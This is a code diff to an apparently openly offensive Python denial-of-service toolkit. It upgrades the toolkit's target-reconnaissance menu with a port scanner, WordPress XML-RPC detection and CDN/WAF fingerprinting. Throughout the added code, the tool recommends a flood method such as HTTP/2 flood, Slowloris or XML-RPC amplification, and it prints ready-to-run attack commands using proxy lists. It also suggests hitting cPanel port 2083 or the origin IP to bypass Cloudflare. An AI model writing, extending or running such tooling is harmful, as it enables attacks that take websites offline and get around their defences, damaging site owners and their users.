@@ -131,7 +131,7 @@ def main():
 def run_intel():
     clear()
     banner()
-    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER ]{bcolors.RESET}")
+    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER PRO ]{bcolors.RESET}")
     target = input(f"Enter Target Domain (e.g. example.com): {bcolors.OKBLUE}").strip()
     print(f"{bcolors.RESET}", end="")
     
@@ -145,81 +145,109 @@ def run_intel():
     print("-" * 40)
     print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
     
+    resolved_ip = None
     try:
         import socket
         resolved_ip = socket.gethostbyname(target_domain)
         print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
     except Exception as e:
         print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")
-        resolved_ip = None
 
-    print(f"\n{bcolors.OKCYAN}Phase 2: Technology & Security Analysis...{bcolors.RESET}")
+    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner...{bcolors.RESET}")
+    open_ports = []
+    interesting_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 8880]
+    try:
+        import socket
+        for port in interesting_ports:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((target_domain, port))
+            if result == 0:
+                print(f"[*] Port {port:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
+                open_ports.append(port)
+            sock.close()
+    except:
+        pass
+
+    print(f"\n{bcolors.OKCYAN}Phase 3: CMS & Vulnerability Hunter...{bcolors.RESET}")
+    cms_detected = "Unknown"
+    vuln_vector = None
+    
     try:
         import requests
-        # Use a real browser UA to avoid instant blocks
+        import urllib3
+        urllib3.disable_warnings() 
+        
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
+        
+        # 1. Base Check
+        r = requests.head(target_url, headers=headers, timeout=5, verify=False)
+        server_header = r.headers.get('Server', 'Unknown')
+        powered_by = r.headers.get('X-Powered-By', 'Unknown')
+        
+        # 2. WordPress XMLRPC Check
+        print("[*] Checking for WordPress XML-RPC...", end="\r")
         try:
-            r = requests.head(target_url, headers=headers, timeout=5, verify=False)
-            server_header = r.headers.get('Server', 'Unknown')
-            powered_by = r.headers.get('X-Powered-By', 'Unknown')
-            via = r.headers.get('Via', '')
-            cdn_guess = "Unknown"
-            
-            # WAF/CDN Detection Heuristics
-            wafs = {
-                "cloudflare": "Cloudflare",
-                "akamai": "Akamai",
-                "fastly": "Fastly",
-                "imperva": "Imperva",
-                "incapsula": "Imperva",
-                "sucuri": "Sucuri"
-            }
-            
-            headers_str = str(r.headers).lower()
-            for key, name in wafs.items():
-                if key in headers_str:
-                    cdn_guess = name
-                    break
-            
-            print(f"[*] Server Header : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")
-            print(f"[*] X-Powered-By  : {bcolors.OKGREEN}{powered_by}{bcolors.RESET}")
-            if cdn_guess != "Unknown":
-                print(f"[*] CDN/WAF       : {bcolors.FAIL}{cdn_guess} DETECTED!{bcolors.RESET}")
-            
-            # Phase 3: Recommendation Engine
-            print(f"\n{bcolors.OKCYAN}Phase 3: Tactical Recommendation{bcolors.RESET}")
-            recommended_method = "H2_FLOOD" # Default fallback
-            reason = "General High Throughput"
-            
-            if "Apache" in server_header:
-                recommended_method = "SLOW"
-                reason = "Apache is vulnerable to Slowloris (Thread Starvation)"
-            elif "nginx" in server_header.lower() or "cloudflare" in server_header.lower():
-                recommended_method = "H2_FLOOD"
-                reason = "Nginx/Cloudflare handles concurrency well, requires Multiplexing Flood"
-            elif "LiteSpeed" in server_header or "LiteSpeed" in powered_by:
-                recommended_method = "H2_FLOOD"
-                reason = "LiteSpeed is resilient, high volume H2 traffic needed"
-            
-            if resolved_ip and not cdn_guess == "Unknown":
-                 print(f"{bcolors.WARNING}[!] Warning: Target is behind {cdn_guess}.{bcolors.RESET}")
-                 print(f"    You should try to find the ORIGIN IP of the server.")
-                 print(f"    If you attack {resolved_ip} directly, you might bypass the WAF.")
-            
-            print(f"\n{bcolors.BOLD}>>> RECOMMENDED STRATEGY <<<{bcolors.RESET}")
-            print(f"Method : {bcolors.OKGREEN}{recommended_method}{bcolors.RESET}")
-            print(f"Reason : {reason}")
-            
-            if recommended_method == "SLOW":
-                 print(f"Command: {bcolors.OKBLUE}python3 start.py SLOW {target_url} 5 1000 proxy.txt 100 800{bcolors.RESET}")
+            xml_url = f"{target_url}/xmlrpc.php"
+            r_xml = requests.get(xml_url, headers=headers, timeout=5, verify=False)
+            if r_xml.status_code == 405 or "XML-RPC server accepts POST requests only" in r_xml.text:
+                print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
+                cms_detected = "WordPress"
+                vuln_vector = "XMLRPC"
             else:
-                 print(f"Command: {bcolors.OKBLUE}python3 start.py {recommended_method} {target_url} 7 100 proxy.txt 50 800{bcolors.RESET}")
+                 print(f"[*] XML-RPC      : Safe/Not Found           ")
+        except:
+             print(f"[*] XML-RPC      : Error Checking           ")
 
-        except Exception as e:
-             print(f"{bcolors.FAIL}[!] Header Analysis Failed: {e}{bcolors.RESET}")
+        # 3. WAF Detection
+        cdn_guess = "Unknown"
+        wafs = {
+            "cloudflare": "Cloudflare",
+            "akamai": "Akamai",
+            "fastly": "Fastly",
+            "imperva": "Imperva",
+            "incapsula": "Imperva",
+            "sucuri": "Sucuri"
+        }
+        headers_str = str(r.headers).lower()
+        for key, name in wafs.items():
+            if key in headers_str:
+                cdn_guess = name
+                break
+        
+        print(f"[*] Server       : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")
+        if cdn_guess != "Unknown":
+            print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")
+
+        # Phase 4: Tacitcal Recommendation
+        print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
+        
+        rec_method = "H2_FLOOD"
+        reason = "Standard High-Throughput HTTP/2 Attack"
+        cmd_example = f"python3 start.py H2_FLOOD {target_url} 7 100 proxy.txt 50 800"
+
+        if vuln_vector == "XMLRPC":
+            rec_method = "XMLRPC"
+            reason = "CRITICAL: XML-RPC Amplification detected! Most damage per request."
+            cmd_example = f"python3 start.py XMLRPC {target_url} 7 100 proxy.txt 50 800 (Use Menu 4)"
+        elif "Apache" in server_header and cdn_guess == "Unknown":
+            rec_method = "SLOW"
+            reason = "Apache Target without WAF is vulnerable to Slowloris."
+            cmd_example = f"python3 start.py SLOW {target_url} 5 1000 proxy.txt 100 800"
+        elif 2083 in open_ports or 2087 in open_ports:
+            rec_method = "H2_FLOOD (Backend)"
+            reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
+            target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
+            cmd_example = f"python3 start.py H2_FLOOD https://{target_url} 7 100 proxy.txt 50 800"
+
+        print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
+        print(f"Reason : {reason}")
+        print(f"Command: {bcolors.OKBLUE}{cmd_example}{bcolors.RESET}")
 
     except ImportError:
-        print(f"{bcolors.FAIL}[!] Missing dependencies! Run: pip install requests{bcolors.RESET}")
+         print(f"{bcolors.FAIL}[!] Missing requests library. run 'pip install requests'{bcolors.RESET}")
+    except Exception as e:
+         print(f"{bcolors.FAIL}[!] Analysis Error: {e}{bcolors.RESET}")
 
     print("\nPress Enter to return to menu...")
     input()
